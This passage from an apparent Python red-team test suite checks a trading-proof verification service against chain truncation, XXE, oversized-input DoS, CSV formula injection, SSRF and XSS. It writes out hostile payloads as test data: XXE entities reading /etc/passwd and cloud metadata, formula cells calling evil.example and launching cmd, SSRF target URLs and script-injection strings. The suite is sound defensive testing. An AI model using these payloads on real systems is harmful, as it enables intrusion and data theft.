            expected_interval_seconds=30 * 86_400,
            grace_window_seconds=5 * 86_400,
        )
        acct_tag = self.ledger.blinded_account_tag

        def _make_chained_bundle(
            *,
            seq: int,
            prev_hash: str | None,
            p_start: str,
            p_end: str,
            issued_at: str,
            b_idx: float,
            e_idx: float,
            tag: str = acct_tag,
            enrolled_at: str = "2026-01-01T06:00:00Z",
        ) -> VerifyProofBundle:
            twr = round((e_idx / b_idx) - 1.0, 8)
            leaves = build_salted_merkle_tree(
                {
                    "core_metrics": {"twr_decimal": twr, "observation_count": 30, "psr_sample_eligible": True},
                    "indexed_curve": [
                        {"timestamp_utc": p_start, "index_value": 100.0, "drawdown_pct": 0.0},
                        {"timestamp_utc": p_end, "index_value": round(100.0 * (1.0 + twr), 6), "drawdown_pct": 0.0},
                    ],
                    "reconciliation": {"status": "reconciled_within_tolerance", "ledger_completeness_ok": True},
                    "coaching_and_context": {"imported_journal_tags": []},
                    "capital_bracket": {"capital_bracket": "100k_to_1m"},
                    "benchmark_alpha": {"benchmark_symbol": "SPY.US"},
                    "delayed_closed_trades": [],
                }
            )
            link = ProspectiveChainLink(
                chain_id="chn-w5-redteam",
                sequence_number=seq,
                prev_proof_hash=prev_hash,
                blinded_account_tag=tag,
                enrolled_at_utc=enrolled_at,
                period_start_utc=p_start,
                period_end_utc=p_end,
                issued_at_utc=issued_at,
                cadence_policy=cadence,
                beginning_index_value=b_idx,
                ending_index_value=e_idx,
                period_twr_decimal=twr,
            )
            return create_signed_proof_bundle(
                proof_id=f"prf-chn-{seq}",
                issued_at_utc=issued_at,
                publisher_kid=self.kid,
                publisher_private_key_hex=self.kp.private_key_hex,
                broker_id="ibkr",
                blinded_account_tag=tag,
                account_scope=AccountScope.ALL_ENUMERATED_SUBACCOUNTS,
                provider_approval_state=ProviderApprovalState.APPROVED_LIVE,
                environment_tier=EnvironmentTier.LIVE_PRODUCTION,
                claimed_origin_assurance=OriginAssurance.OPERATOR_RETRIEVED,
                source_body_sha256=hashlib.sha256(f"chain-{seq}".encode("utf-8")).hexdigest(),
                period_start_utc=p_start,
                period_end_utc=p_end,
                base_currency="USD",
                merkle_tree=leaves,
                prospective_chain_link=link,
            )

        b0 = _make_chained_bundle(
            seq=0,
            prev_hash=None,
            p_start="2026-01-01T00:00:00Z",
            p_end="2026-01-31T00:00:00Z",
            issued_at="2026-01-31T12:00:00Z",
            b_idx=100.0,
            e_idx=105.0,
        )
        b1 = _make_chained_bundle(
            seq=1,
            prev_hash=b0.proof_hash(),
            p_start="2026-01-31T00:00:00Z",
            p_end="2026-03-02T00:00:00Z",
            issued_at="2026-03-02T12:00:00Z",
            b_idx=105.0,
            e_idx=110.25,
        )
        b2 = _make_chained_bundle(
            seq=2,
            prev_hash=b1.proof_hash(),
            p_start="2026-03-02T00:00:00Z",
            p_end="2026-04-01T00:00:00Z",
            issued_at="2026-04-01T12:00:00Z",
            b_idx=110.25,
            e_idx=102.0,
        )

        # Valid 3-link chain passes
        valid_chain = verify_prospective_chain([b0, b1, b2], now_utc="2026-04-02T00:00:00Z")
        self.assertTrue(valid_chain.valid, valid_chain.details)
        self.assertEqual(valid_chain.continuity_mode, ChainContinuityMode.PROSPECTIVE_CONTINUOUS)

        # Attack A: Tail truncation when C2SP continuity log already recorded seq=2!
        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_p = Path(tmp_dir)
            app = create_app(
                ApiConfig(
                    db_path=str(tmp_p / "p.sqlite3"),
                    sync_db_path=str(tmp_p / "s.sqlite3"),
                    publisher_keypair=self.kp,
                    publisher_kid=self.kid,
                ),
                prefer_fastapi=False,
            )
            try:
                client = VerifyApiTestClient(app)
                self.assertEqual(
                    client.post(
                        "/api/v1/chains",
                        json={"proof_bundle": b0.to_dict(), "now_utc": "2026-01-31T12:05:00Z"},
                    ).status_code,
                    201,
                )
                self.assertEqual(
                    client.post(
                        "/api/v1/chains/chn-w5-redteam/append",
                        json={"proof_bundle": b1.to_dict(), "now_utc": "2026-03-02T12:05:00Z"},
                    ).status_code,
                    200,
                )
                self.assertEqual(
                    client.post(
                        "/api/v1/chains/chn-w5-redteam/append",
                        json={"proof_bundle": b2.to_dict(), "now_utc": "2026-04-01T12:05:00Z"},
                    ).status_code,
                    200,
                )
                tlog_leaves = app.store.get_continuity_leaves_for_account(acct_tag)

                # Presenter hides losing month b2 and only presents [b0, b1]
                truncated_ver = verify_proof_bundle(
                    b1,
                    registry_doc=app.store.build_registry_document(),
                    chain_history=[b0, b1],
                    continuity_log_leaves=tlog_leaves,
                    now_utc="2026-04-02T00:00:00Z",
                )
                self.assertFalse(truncated_ver.valid)
                assert truncated_ver.chain_verification is not None
                self.assertIn(
                    ChainInvariantViolationCode.STALE_OR_TRUNCATED_TAIL,
                    truncated_ver.chain_verification.violation_codes,
                )
            finally:
                app.close()

        # Attack B: Sequence gap [b0, b2]
        gap_res = verify_prospective_chain([b0, b2], now_utc="2026-04-02T00:00:00Z")
        self.assertFalse(gap_res.valid)
        self.assertIn(ChainInvariantViolationCode.NON_MONOTONIC_SEQUENCE, gap_res.violation_codes)

        # Attack C: prev_proof_hash swap
        b1_bad_prev = _make_chained_bundle(
            seq=1,
            prev_hash="aa" * 32,
            p_start="2026-01-31T00:00:00Z",
            p_end="2026-03-02T00:00:00Z",
            issued_at="2026-03-02T12:00:00Z",
            b_idx=105.0,
            e_idx=110.25,
        )
        swap_res = verify_prospective_chain([b0, b1_bad_prev], now_utc="2026-03-03T00:00:00Z")
        self.assertFalse(swap_res.valid)
        self.assertIn(ChainInvariantViolationCode.PREV_HASH_MISMATCH, swap_res.violation_codes)

        # Attack D: Backdated / premature issued_at_utc (< period_end_utc) OR late genesis backfill
        b1_backdated = _make_chained_bundle(
            seq=1,
            prev_hash=b0.proof_hash(),
            p_start="2026-01-31T00:00:00Z",
            p_end="2026-03-02T00:00:00Z",
            issued_at="2026-01-15T12:00:00Z",
            b_idx=105.0,
            e_idx=110.25,
        )
        backdate_res = verify_prospective_chain([b0, b1_backdated], now_utc="2026-03-03T00:00:00Z")
        self.assertFalse(backdate_res.valid)
        self.assertIn(ChainInvariantViolationCode.MISSED_INTERVAL_DETECTED, backdate_res.violation_codes)

        b0_retro = _make_chained_bundle(
            seq=0,
            prev_hash=None,
            p_start="2026-01-01T00:00:00Z",
            p_end="2026-01-31T00:00:00Z",
            issued_at="2026-01-31T12:00:00Z",
            b_idx=100.0,
            e_idx=112.0,
            enrolled_at="2026-01-15T00:00:00Z",
        )
        retro_res = verify_prospective_chain([b0_retro], now_utc="2026-02-01T00:00:00Z")
        self.assertEqual(retro_res.continuity_mode, ChainContinuityMode.RETROSPECTIVE_BACKFILL)
        self.assertIn(ChainInvariantViolationCode.GENESIS_BACKFILL_WINDOW_EXCEEDED, retro_res.violation_codes)

        # Attack E: Different blinded_account_tag splicing mid-chain
        other_tag = compute_blinded_account_tag("ibkr", "SPLICE-OTHER-999", REDTEAM_SALT_HEX)
        b1_spliced = _make_chained_bundle(
            seq=1,
            prev_hash=b0.proof_hash(),
            p_start="2026-01-31T00:00:00Z",
            p_end="2026-03-02T00:00:00Z",
            issued_at="2026-03-02T12:00:00Z",
            b_idx=105.0,
            e_idx=110.25,
            tag=other_tag,
        )
        splice_res = verify_prospective_chain([b0, b1_spliced], now_utc="2026-03-03T00:00:00Z")
        self.assertFalse(splice_res.valid)
        self.assertIn(ChainInvariantViolationCode.ACCOUNT_CONTINUITY_VIOLATION, splice_res.violation_codes)


class TestWave5ParserXxeSsrfFormulaInjectionAndDos(unittest.TestCase):
    """Domain 2: XXE, 26 MB DoS bounds, CSV formula injection across all 8+ formats, SSRF, and extreme math."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        tmp_p = Path(self._tmp.name)
        self.kp = generate_ed25519_keypair()
        self.cfg = ApiConfig(
            db_path=str(tmp_p / "p.sqlite3"),
            sync_db_path=str(tmp_p / "s.sqlite3"),
            publisher_keypair=self.kp,
            publisher_kid="kid-w5-parser",
        )
        self.app = create_app(self.cfg, prefer_fastapi=False)
        self.client = VerifyApiTestClient(self.app)

    def tearDown(self) -> None:
        self.app.close()
        self._tmp.cleanup()

    def test_xxe_system_parameter_mixed_case_and_utf16_bom_blocked_everywhere(self) -> None:
        xxe_classic = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
            '<FlexQueryResponse><FlexStatements count="1">'
            '<FlexStatement accountId="U1234567" baseCurrency="USD">&xxe;</FlexStatement>'
            "</FlexStatements></FlexQueryResponse>"
        )
        xxe_param = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [ <!ENTITY % p SYSTEM "http://169.254.169.254/latest/meta-data/"> %p; ]>'
            '<FlexQueryResponse><FlexStatements count="1">'
            '<FlexStatement accountId="U1234567" baseCurrency="USD" />'
            "</FlexStatements></FlexQueryResponse>"
        )
        xxe_mixed_html = (
            "<!dOcTyPe html SYSTEM \"file:///etc/hosts\">"
            "<html><head><title>Statement: 881122 - MetaTrader 4</title></head>"
            "<body><table><tr><td>Closed Transactions:</td></tr></table></body></html>"
        )
        utf16_le_xxe = b"\xff\xfe" + xxe_classic.encode("utf-16-le")
        utf16_be_xxe = b"\xfe\xff" + xxe_param.encode("utf-16-be")

        for label, payload in (
            ("classic_utf8", xxe_classic.encode("utf-8")),
            ("param_entity", xxe_param.encode("utf-8")),
            ("mixed_doctype_html", xxe_mixed_html.encode("utf-8")),
            ("utf16_le_bom", utf16_le_xxe),
            ("utf16_be_bom", utf16_be_xxe),
        ):
            with self.subTest(parser="ibkr_flex", case=label):
                with self.assertRaises((IbkrFlexXmlSecurityError, IbkrFlexParseError)):
                    parse_ibkr_flex_xml(payload)
            with self.subTest(parser="mt4", case=label):
                with self.assertRaises((StatementXmlHtmlSecurityError, IbkrFlexXmlSecurityError)):
                    parse_mt4_statement(payload)
            with self.subTest(parser="mt5", case=label):
                with self.assertRaises((StatementXmlHtmlSecurityError, IbkrFlexXmlSecurityError)):
                    parse_mt5_statement(payload)
            with self.subTest(parser="auto_detect_fn", case=label):
                with self.assertRaises((StatementXmlHtmlSecurityError, IbkrFlexXmlSecurityError)):
                    detect_and_parse_statement(payload)
            with self.subTest(parser="api_auto_detect", case=label):
                resp = self.client.post(
                    "/api/v1/verify/auto-detect",
                    content=payload,
                    headers={"Content-Type": "application/octet-stream"},
                )
                self.assertEqual(resp.status_code, 422, resp.text)
                self.assertNotIn("root:", resp.text)

    def test_26mb_oversized_csv_xml_html_rejected_fast_without_oom(self) -> None:
        size_26mb = 26 * 1024 * 1024
        oversized_csv = b"Activity Date,Process Date,Settle Date,Instrument,Description,Trans Code,Quantity,Price,Amount\n" + (
            b"01/15/2026,01/15/2026,01/16/2026,AAPL,Apple,Buy,1,$180.00,($180.00)\n" * (size_26mb // 68 + 16)
        )
        oversized_xml = b"<FlexQueryResponse>" + (b" " * size_26mb) + b"</FlexQueryResponse>"
        oversized_html = b"<html><table>" + (b"<tr><td>x</td></tr>" * (size_26mb // 19 + 16)) + b"</table></html>"

        for kind, blob in (("csv", oversized_csv), ("xml", oversized_xml), ("html", oversized_html)):
            self.assertGreater(len(blob), 25 * 1024 * 1024)
            with self.subTest(kind=kind):
                t0 = time.monotonic()
                with self.assertRaises(StatementSizeLimitExceededError):
                    detect_and_parse_statement(blob)
                self.assertLess(time.monotonic() - t0, 1.5)

                t1 = time.monotonic()
                resp = self.client.post(
                    "/api/v1/verify/auto-detect",
                    content=blob,
                    headers={"Content-Type": "application/octet-stream"},
                )
                self.assertEqual(resp.status_code, 413, resp.text)
                self.assertEqual(resp.json()["error"], "payload_too_large")
                self.assertLess(time.monotonic() - t1, 1.5)

    def test_csv_formula_injection_neutralized_end_to_end_across_all_importers(self) -> None:
        formula_payloads = [
            '=HYPERLINK("https://evil.example/leak", "click")',
            "  +cmd|' /C calc'!A0",
            "-2+3+cmd|' /C calc'!A0",
            "@SUM(1+1)*cmd|' /C calc'!A0",
            "\t=IMPORTXML(\"https://evil.example/x\", \"//a\")",
            "'=cmd",
        ]
        bad_prefixes = ("=", "+", "-", "@", "'", "|", "\t", "\r", "\n")

        def _assert_clean_cell(val: str | None, ctx: str) -> None:
            if not val:
                return
            self.assertFalse(
                val.startswith(bad_prefixes) or val.lstrip().startswith(bad_prefixes),
                f"Unsanitized formula prefix in {ctx}: {val!r}",
            )

        for idx, inj in enumerate(formula_payloads):
            q_inj = inj.replace('"', '""')
            xml_inj = (
                inj.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace('"', "&quot;")
                .replace("\t", "&#9;")
            )

            # Build all 8 requested CSV/HTML formats + IBKR Flex XML carrying the formula payload
            tradersync_csv = (
                "Status,Symbol,Size,Open Date,Close Date,Open Time,Close Time,Entry Price,Exit Price,Return $,Return %,Setups,Mistakes,Notes\n"
                f'WIN,"{q_inj}",10,2026-01-05,2026-01-06,09:35:00,15:50:00,100.00,108.00,80.00,8.0,"{q_inj}","{q_inj}","{q_inj}"\n'
            )
            tradezella_csv = (
                "Symbol,Side,Open Date,Close Date,Entry Price,Exit Price,Quantity,Net P&L,Playbook,Mistake Tags,Custom Tags,Notes\n"
                f'"{q_inj}",Long,2026-01-05 09:35:00,2026-01-06 15:50:00,100.00,108.00,10,80.00,"{q_inj}","{q_inj}","{q_inj}","{q_inj}"\n'
            )
            mt4_csv = (
                "Ticket,Open Time,Type,Size,Item,Price,S / L,T / P,Close Time,Close Price,Commission,Taxes,Swap,Profit,Comment\n"
                "1001,2026.01.02 09:00:00,balance,0.00,,0.00,0.00,0.00,2026.01.02 09:00:00,0.00,0.00,0.00,0.00,25000.00,Initial Deposit\n"
                f'1002,2026.01.05 10:00:00,buy,1.00,"{q_inj}",1.1000,0.00,0.00,2026.01.08 14:00:00,1.1080,-5.00,0.00,0.00,800.00,"{q_inj}"\n'
            )
            mt5_csv = (
                "Time,Deal,Symbol,Type,Direction,Volume,Price,Order,Commission,Fee,Swap,Profit,Balance,Comment\n"
                "2026.01.02 09:00:00,5001,,balance,,0.00,0.00,0,0.00,0.00,0.00,25000.00,25000.00,Deposit\n"
                f'2026.01.05 10:00:00,5002,"{q_inj}",buy,in,1.00,100.00,9001,-2.00,0.00,0.00,0.00,24998.00,"{q_inj}"\n'
                f'2026.01.08 14:00:00,5003,"{q_inj}",sell,out,1.00,106.00,9002,-2.00,0.00,0.00,600.00,25596.00,"{q_inj}"\n'
            )
            degiro_csv = (
                "Date,Time,Value date,Product,ISIN,Description,FX,Change,,Balance,,Order Id\n"
                "02-01-2026,09:00,02-01-2026,,,Deposit,,EUR,20000.00,EUR,20000.00,\n"
                f'05-01-2026,10:15,05-01-2026,"{q_inj}",US0378331005,"Buy 10 @ 150 EUR",,EUR,-1500.00,EUR,18500.00,ORD-1\n'
                f'12-01-2026,15:15,12-01-2026,"{q_inj}",US0378331005,"Sell 10 @ 162 EUR",,EUR,1620.00,EUR,20120.00,ORD-2\n'
            )
            robinhood_csv = (
                "Activity Date,Process Date,Settle Date,Instrument,Description,Trans Code,Quantity,Price,Amount\n"
                "01/02/2026,01/02/2026,01/02/2026,,ACH Deposit,ACH,,,$25000.00\n"
                f'01/05/2026,01/05/2026,01/06/2026,"{q_inj}","{q_inj}",Buy,10,$150.00,($1500.00)\n'
                f'01/12/2026,01/12/2026,01/13/2026,"{q_inj}","{q_inj}",Sell,10,$165.00,$1650.00\n'
            )
            schwab_csv = (
                "Date,Action,Symbol,Description,Quantity,Price,Fees & Comm,Amount\n"
                '01/02/2026,MoneyLink Deposit,,Cash Deposit,,,,$25000.00\n'
                f'01/05/2026,Buy,"{q_inj}","{q_inj}",10,$150.00,$1.00,-$1501.00\n'
                f'01/12/2026,Sell,"{q_inj}","{q_inj}",10,$165.00,$1.00,$1649.00\n'
            )
            tradovate_csv = (
                "symbol,qty,buyPrice,sellPrice,pnl,boughtTimestamp,soldTimestamp,buyFillId,sellFillId\n"
                f'"{q_inj}",1,5000.00,5012.00,$600.00,01/05/2026 10:00:00,01/06/2026 14:00:00,BF-1,SF-1\n'
            )
            ibkr_xml = (
                '<?xml version="1.0" encoding="UTF-8"?>'
                '<FlexQueryResponse queryName="W5" type="AF"><FlexStatements count="1">'
                '<FlexStatement accountId="U7654321" baseCurrency="USD" fromDate="2026-01-01" toDate="2026-01-31">'
                '<EquitySummaryInBase>'
                '<EquitySummaryByReportDateInBase reportDate="2026-01-02" cash="25000" total="25000" />'
                '<EquitySummaryByReportDateInBase reportDate="2026-01-20" cash="26200" total="26200" />'
                '</EquitySummaryInBase>'
                f'<Trades><Trade ibExecID="EX-1" symbol="{xml_inj}" description="{xml_inj}" assetCategory="STK" buySell="BUY" quantity="10" tradePrice="150" currency="USD" ibCommission="-1" dateTime="2026-01-05;10:00:00" levelOfDetail="EXECUTION" />'
                f'<Trade ibExecID="EX-2" symbol="{xml_inj}" description="{xml_inj}" assetCategory="STK" buySell="SELL" quantity="-10" tradePrice="162" currency="USD" ibCommission="-1" dateTime="2026-01-12;15:00:00" levelOfDetail="EXECUTION" /></Trades>'
                f'<CashTransactions><CashTransaction type="Dividends" symbol="{xml_inj}" description="{xml_inj}" amount="25.00" currency="USD" dateTime="2026-01-15;09:00:00" levelOfDetail="DETAIL" /></CashTransactions>'
                "</FlexStatement></FlexStatements></FlexQueryResponse>"
            )

            format_matrix = [
                ("tradersync_journal", tradersync_csv, "tradersync.csv"),
                ("tradezella_journal", tradezella_csv, "tradezella.csv"),
                ("mt4_statement", mt4_csv, "mt4.csv"),
                ("mt5_statement", mt5_csv, "mt5.csv"),
                ("degiro_csv", degiro_csv, "degiro.csv"),
                ("robinhood_csv", robinhood_csv, "robinhood.csv"),
                ("schwab_csv", schwab_csv, "schwab.csv"),
                ("tradovate_csv", tradovate_csv, "tradovate.csv"),
                ("ibkr_flex_xml", ibkr_xml, "flex.xml"),
            ]

            for expected_fmt, doc_text, fname in format_matrix:
                with self.subTest(payload_idx=idx, format=expected_fmt):
                    det = detect_and_parse_statement(doc_text.encode("utf-8"), filename=fname)
                    self.assertEqual(det.detected_format, expected_fmt)
                    for tr in det.ledger.trades:
                        _assert_clean_cell(tr.symbol, f"{expected_fmt}.trade.symbol")
                    for fl in det.ledger.flows:
                        _assert_clean_cell(fl.symbol, f"{expected_fmt}.flow.symbol")
                        _assert_clean_cell(fl.description, f"{expected_fmt}.flow.description")
                    for tag in det.imported_journal_tags:
                        _assert_clean_cell(tag, f"{expected_fmt}.journal_tag")

                    # End-to-end via POST /api/v1/verify/auto-detect on first & last payload
                    if idx in {0, len(formula_payloads) - 1}:
                        api_resp = self.client.post(
                            "/api/v1/verify/auto-detect",
                            json={
                                "raw_statement_text": doc_text,
                                "filename": fname,
                                "issued_at_utc": "2026-02-20T12:00:00Z",
                            },
                        )
                        self.assertEqual(api_resp.status_code, 200, api_resp.text)
                        body = api_resp.json()
                        for tag in body.get("imported_journal_tags", []):
                            _assert_clean_cell(tag, f"api.{expected_fmt}.imported_journal_tags")
                        out_bundle = VerifyProofBundle.from_dict(body["bundle"])
                        delayed = out_bundle.get_disclosed_payload("delayed_closed_trades")
                        delayed_trades = (
                            delayed.get("trades", [])
                            if isinstance(delayed, dict)
                            else (delayed or [])
                        )
                        for closed_tr in delayed_trades:
                            if isinstance(closed_tr, dict):
                                _assert_clean_cell(
                                    closed_tr.get("symbol"),
                                    f"api.{expected_fmt}.delayed_symbol",
                                )

        # Second-order formula prefix emergence after $ / long-digit redaction
        for second_order in ("$100=cmd", "-12345+cmd", "'=cmd", "|=cmd"):
            tag_out = sanitize_journal_tag(second_order)
            _assert_clean_cell(tag_out, f"sanitize_journal_tag({second_order!r})")
            for core_tag in sanitize_journal_tags([second_order]):
                _assert_clean_cell(core_tag, f"sanitize_journal_tags({second_order!r})")

    def test_connectors_block_write_scopes_mutating_messages_paper_accounts_and_ssrf_hosts(self) -> None:
        # 1. cTrader write-scope pre-flight rejection BEFORE any message/HTTP transport executes
        transport_calls = 0

        def _counting_msg_transport(msg_type: str, payload: dict[str, Any]) -> dict[str, Any]:
            nonlocal transport_calls
            transport_calls += 1
            return {}

        for bad_scope in (SCOPE_TRADING, "accounts trading", "scope_trade", ["accounts", "orders"], 1, None, True):
            with self.assertRaises(WriteCapableCredentialsRejectedError):
                CTraderReadOnlyOAuthAdapter(
                    access_token="ct-tok-1234",
                    scope=bad_scope,  # type: ignore[arg-type]
                    message_transport=_counting_msg_transport,
                )
        self.assertEqual(transport_calls, 0)

        # 2. cTrader mutating messages structurally blocked
        ct_ro = CTraderReadOnlyOAuthAdapter(
            access_token="ct-tok-1234",
            scope=SCOPE_ACCOUNTS,
            message_transport=_counting_msg_transport,
        )
        for bad_fn in (
            ct_ro.place_order,
            ct_ro.cancel_order,
            ct_ro.amend_order,
            ct_ro.amend_position_sltp,
            ct_ro.close_position,
        ):
            with self.assertRaises(DisallowedCapabilityError):
                bad_fn()
        self.assertEqual(transport_calls, 0)

        # 3. cTrader demo account (isLive=False) rejected
        ct_demo = CTraderReadOnlyOAuthAdapter(
            access_token="ct-tok-1234",
            scope=SCOPE_ACCOUNTS,
            message_transport=lambda mt, _p: {
                "ctidTraderAccount": [{"ctidTraderAccountId": 9911, "isLive": False}]
            }
            if mt == "ProtoOAGetAccountListByAccessTokenReq"
            else {},
        )
        with self.assertRaises(PaperOrSandboxAccountRejectedError):
            ct_demo.enumerate_accounts()

        # 4. SSRF host validation across ALL live broker & EODHD reference connectors
        ssrf_urls = [
            "https://169.254.169.254",
            "https://127.0.0.1:8443",
            "https://[::1]",
            "https://localhost",
            "https://metadata.google.internal",
            "http://openapi.ctrader.com",
            "https://user:secret@api.alpaca.markets",
            "https://evil-ssrf.attacker.example",
        ]
        for bad_url in ssrf_urls:
            with self.subTest(connector="ctrader", url=bad_url):
                with self.assertRaises(PaperOrSandboxAccountRejectedError):
                    CTraderReadOnlyOAuthAdapter(access_token="tok", scope="accounts", base_url=bad_url)
            with self.subTest(connector="alpaca", url=bad_url):
                with self.assertRaises(PaperOrSandboxAccountRejectedError):
                    AlpacaReadOnlyAdapter(api_key_id="k", api_secret_key="s", base_url=bad_url)
            with self.subTest(connector="tradier", url=bad_url):
                with self.assertRaises(PaperOrSandboxAccountRejectedError):
                    TradierReadOnlyAdapter(access_token="tok", base_url=bad_url)
            with self.subTest(connector="schwab", url=bad_url):
                with self.assertRaises(PaperOrSandboxAccountRejectedError):
                    SchwabReadOnlyAdapter(access_token="tok", base_url=bad_url, hosted_mode=False)
            with self.subTest(connector="ibkr_oauth", url=bad_url):
                with self.assertRaises(PaperOrSandboxAccountRejectedError):
                    IbkrOAuthReadOnlyAdapter(
                        access_token="tok",
                        live_session_token_b64="YWJjZA==",
                        base_url=bad_url,
                        hosted_mode=False,
                    )
            with self.subTest(connector="trading212", url=bad_url):
                with self.assertRaises(PaperOrSandboxAccountRejectedError):
                    Trading212ReadOnlyAdapter(api_key="k", api_secret="s", base_url=bad_url)
            with self.subTest(connector="ccxt_binance", url=bad_url):
                with self.assertRaises(PaperOrSandboxAccountRejectedError):
                    CcxtExchangeReadOnlyAdapter("binance", base_url=bad_url)
            with self.subTest(connector="eodhd", url=bad_url):
                with self.assertRaises(ValueError):
                    EodhdReferenceProvider(api_key="eodhd-test-key", base_url=bad_url)

    def test_extreme_floats_booleans_and_bounds_across_plausibility_and_xirr(self) -> None:
        # 1. Core Python evaluate_claim_plausibility rejects non-finite, bool, T=0/1/999999, kurt=-10
        bad_core_inputs: list[dict[str, Any]] = [
            {"claimed_sharpe": float("nan"), "observed_periods": 60},
            {"claimed_sharpe": float("inf"), "observed_periods": 60},
            {"claimed_sharpe": float("-inf"), "observed_periods": 60},
            {"claimed_sharpe": 1e308, "observed_periods": 60},
            {"claimed_sharpe": -1e308, "observed_periods": 60},
            {"claimed_sharpe": True, "observed_periods": 60},
            {"claimed_sharpe": 2.0, "observed_periods": False},
            {"claimed_sharpe": 2.0, "observed_periods": 0},
            {"claimed_sharpe": 2.0, "observed_periods": 1},
            {"claimed_sharpe": 2.0, "observed_periods": 999999},
            {"claimed_sharpe": 2.0, "observed_periods": 60, "excess_kurtosis": -10.0},
            {"claimed_sharpe": 2.0, "observed_periods": 60, "skewness": -500.0},
        ]
        for kwargs in bad_core_inputs:
            with self.assertRaises(ValueError):
                evaluate_claim_plausibility(**kwargs)

        # 2. HTTP POST /api/v1/tools/plausibility rejects malformed JSON NaN/Infinity & extreme/bool bounds
        for raw_nan_json in (
            b'{"claimed_sharpe": NaN, "observed_periods": 60}',
            b'{"claimed_sharpe": Infinity, "observed_periods": 60}',
            b'{"claimed_sharpe": -Infinity, "observed_periods": 60}',
        ):
            r_raw = self.client.post(
                "/api/v1/tools/plausibility",
                content=raw_nan_json,
                headers={"Content-Type": "application/json"},
            )
            self.assertIn(r_raw.status_code, {400, 422})

        for api_bad in (
            {"claimed_sharpe": 1e308, "observed_periods": 60},
            {"claimed_sharpe": -1e308, "observed_periods": 60},
            {"claimed_sharpe": True, "observed_periods": 60},
            {"claimed_sharpe": False, "observed_periods": 60},
            {"claimed_sharpe": 2.5, "observed_periods": 0},
            {"claimed_sharpe": 2.5, "observed_periods": 1},
            {"claimed_sharpe": 2.5, "observed_periods": 999999},
            {"claimed_sharpe": 2.5, "observed_periods": 60, "excess_kurtosis": -10.0},
            {"claimed_sharpe": 2.5, "observed_periods": 60, "skewness": 999.0},
        ):
            r_api = self.client.post("/api/v1/tools/plausibility", json=api_bad)
            self.assertEqual(r_api.status_code, 422, r_api.text)

        if WEB_LIB_DIR.is_dir():
            # 3. TypeScript plausibilityMath.ts clamps all extreme/NaN/bool values without ever emitting NaN/Infinity
            ts_math = _run_node_module(
                f"""
                import {{ computeClaimPlausibility }} from {json.dumps(str(WEB_LIB_DIR / "plausibilityMath.ts"))};
                const vectors = [
                  {{ claimedSharpe: NaN, observedPeriods: 0, excessKurtosis: -10, skewness: -999 }},
                  {{ claimedSharpe: Infinity, observedPeriods: 1, excessKurtosis: Infinity, skewness: Infinity }},
                  {{ claimedSharpe: -Infinity, observedPeriods: 999999, excessKurtosis: -Infinity, skewness: 999 }},
                  {{ claimedSharpe: 1e308, observedPeriods: 999999, excessKurtosis: 1e308, skewness: -1e308 }},
                  {{ claimedSharpe: true, observedPeriods: false }},
                ];
                const ok = vectors.every((v) => {{
                  const res = computeClaimPlausibility(v);
                  return (
                    Number.isFinite(res.claimed_sharpe) &&
                    Number.isFinite(res.implied_psr) &&
                    res.implied_psr >= 0 && res.implied_psr <= 1 &&
                    res.bell_curve_points.every((pt) => Number.isFinite(pt.sharpe) && Number.isFinite(pt.density))
                  );
                }});
                process.stdout.write(JSON.stringify({{ ok }}));
                """,
            )
            self.assertTrue(ts_math["ok"])
        # 4. ACT/365 XIRR solver rejects bool, NaN, +-Infinity, and same-timestamp float overflow,
        # while solving extreme 1e308 valid cash flows via log-scaled NPV without OverflowError!
        t0 = datetime(2025, 1, 1, tzinfo=timezone.utc)
        t1 = datetime(2026, 1, 1, tzinfo=timezone.utc)
        for bad_cf in (
            [(t0, True), (t1, -1.0)],
            [(t0, False), (t1, 100.0)],
            [(t0, float("nan")), (t1, 100.0)],
            [(t0, float("inf")), (t1, -100.0)],
            [(t0, float("-inf")), (t1, 100.0)],
            [(t0, 1e308), (t0, 1e308), (t1, -1e308)],  # same-timestamp sum overflows to inf
        ):
            with self.assertRaises(ValueError):
                solve_xirr_act365(bad_cf)  # type: ignore[arg-type]

        extreme_rate, _ = solve_xirr_act365([(t0, -1e308), (t1, 1.25e308)])
        self.assertIsNotNone(extreme_rate)
        assert extreme_rate is not None
        self.assertAlmostEqual(extreme_rate, 0.25, places=6)


class TestWave5XssClickjackingAndSecretLeakage(unittest.TestCase):
    """Domain 3: XSS, SVG XML validity, CSP headers, @everyone neutralization, and zero secret/$/ID leakage."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        tmp_p = Path(self._tmp.name)
        self.kp = generate_ed25519_keypair()
        self.kid = "kid-w5-xss"
        self.cfg = ApiConfig(
            db_path=str(tmp_p / "p.sqlite3"),
            sync_db_path=str(tmp_p / "s.sqlite3"),
            publisher_keypair=self.kp,
            publisher_kid=self.kid,
        )
        self.app = create_app(self.cfg, prefer_fastapi=False)
        self.client = VerifyApiTestClient(self.app)

    def tearDown(self) -> None:
        self.app.close()
        self._tmp.cleanup()

    def test_xss_pings_and_control_chars_neutralized_across_badges_embeds_and_csp(self) -> None:
        xss_vectors = [
            "<script>onload=alert(1)</script>",
            '"><svg/onload=alert(1)>',
            "javascript:alert(1)",
            "@everyone @here <@&123456>",
            "@everyone.",
            "CTRL\x00\x01\x07\x0b\x1f\x7f\x85END",
        ]
        # Store a valid proof with adversarial symbol & verify all viral / badge surfaces
        ledger = _build_35_day_ledger(symbol='AAPL"><svg/onload=alert(1)>')
        bundle = verify_portfolio(
            ledger=ledger,
            publisher_private_key_hex=self.kp.private_key_hex,
            publisher_kid=self.kid,
            proof_id="prf-w5-xss-001",
            issued_at_utc="2026-02-20T12:00:00Z",
        ).proof_bundle
        post_res = self.client.post("/api/v1/proofs", json={"proof_bundle": bundle.to_dict()})
        self.assertEqual(post_res.status_code, 201, post_res.text)

        allowed_svg_tags = {"svg", "title", "rect", "g", "text", "tspan"}
        for vec in xss_vectors:
            # 1. Python /api/v1/badges/{id}.svg with ?label=vec -> valid XML + strict CSP + zero executable DOM nodes/attrs
            badge_r = self.client.get(
                f"/api/v1/badges/{bundle.proof_id}.svg",
                params={"label": vec},
            )
            self.assertEqual(badge_r.status_code, 200)
            svg_root = ET.fromstring(badge_r.content)  # Must parse as 100% well-formed XML!
            for elem in svg_root.iter():
